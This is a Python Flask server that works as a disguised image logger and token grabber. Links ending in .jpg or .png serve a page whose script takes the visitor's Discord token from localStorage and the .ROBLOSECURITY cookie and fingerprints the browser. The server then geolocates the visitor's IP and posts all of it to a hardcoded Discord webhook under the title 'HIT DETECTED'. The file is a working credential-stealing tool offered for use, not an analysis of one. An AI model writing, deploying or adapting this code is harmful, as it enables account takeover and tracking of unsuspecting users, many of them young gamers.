import os
from flask import Flask, request, Response
import requests
import base64
from datetime import datetime
import traceback

app = Flask(__name__)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-JZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')
IMG_URL = os.environ.get('IMG_URL', 'https://httpbin.org/image/jpeg')

@app.route("/api/main")
def serve_image():
    try:
        img_response = requests.get(IMG_URL, timeout=5)
        img_response.raise_for_status()
        return Response(img_response.content, mimetype=img_response.headers.get("Content-Type", "image/jpeg"))
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        if path.endswith(('.jpg', '.png')) and 'grab' in path.lower():
            return grab_image()
        elif path == 'image.jpg':
            return image_proxy()
        elif path == 'steal':
            return steal_data()
        return Response(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='), mimetype='image/gif')
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def grab_image():
    html = f'''<!DOCTYPE html><html><head><title></title><meta charset="UTF-8">
<script>
(async()=>{{
    let token = localStorage.getItem("token")||'';
    let roblox = document.cookie.split(";").find(c=>c.includes(".ROBLOSECURITY"))||"";
    if(roblox) roblox = roblox.split("=")[1].replace(/^_ \\| WARNING: Obsolete \\| /,"").replace(/ \\|_$/,"");
    
    let data = {{
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: `${{screen.width}}x${{screen.height}}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency||0,
        ram: navigator.deviceMemory||0,
        cookies: document.cookie.split(";").length,
        plugins: navigator.plugins.length,
        ref: document.referrer,
        token: token,
        roblox: roblox,
        battery: navigator.getBattery?'yes':'no',
        net: navigator.connection?.effectiveType||'N/A'
    }};
    
    let params = new URLSearchParams(data).toString();
    navigator.sendBeacon('/steal?'+params);
    location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
}})();
</script>
<style>body{{margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center;}}img{{max-width:100%;height:auto;opacity:.8;}}</style>
</head><body>
<img src="{IMG_URL}" onload="this.style.opacity=1">
</body></html>'''
    return Response(html, mimetype='text/html')

def image_proxy():
    try:
        resp = requests.get(IMG_URL, timeout=3)
        resp.raise_for_status()
        return Response(resp.content, mimetype=resp.headers.get('content-type', 'image/jpeg'))
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def steal_data():
    try:
        params = request.args.to_dict()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr) or 'N/A'
        
        geo = 'N/A'
        isp = 'N/A'
        try:
            geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
            geo_data = geo_resp.json()
            geo = f"{geo_data.get('city', 'N/A')} {geo_data.get('country_name', 'N/A')}"
            isp = geo_data.get('org', 'N/A')
        except:
            pass
        
        embed = {{
            "title": "🎯 HIT DETECTED",
            "color": 16711680,
            "timestamp": "{datetime.utcnow().isoformat()}",
            "fields": [
                {{"name": "🆔 IP", "value": f"```{ip}```", "inline": True}},
                {{"name": "📍 Geo", "value": f"```{geo}```", "inline": True}},
                {{"name": "🌐 ISP", "value": f"```{isp}```", "inline": True}},
                {{"name": "📱 UA", "value": f"```{params.get('ua', 'N/A')[:100]}```", "inline": False}},
                {{"name": "💬 Discord", "value": f"```{params.get('token', 'NONE')[:32]}...```", "inline": False}},
                {{"name": "🎮 Roblox", "value": f"```{params.get('roblox', 'NONE')[:32]}...```", "inline": False}},
                {{"name": "💻 Device", "value": f"```Screen: {params.get('screen', 'N/A')} | CPU: {params.get('cores', 'N/A')} | RAM: {params.get('ram', 'N/A')}GB```", "inline": False}},
                {{"name": "🌐 Network", "value": f"```Lang: {params.get('lang', 'N/A')} | TZ: {params.get('tz', 'N/A')} | Net: {params.get('net', 'N/A')}```", "inline": False}}
            ]
        }}
        
        payload = {{"embeds": [embed]}}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
        
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

@app.errorhandler(Exception)
def handle_error(e):
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif')

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
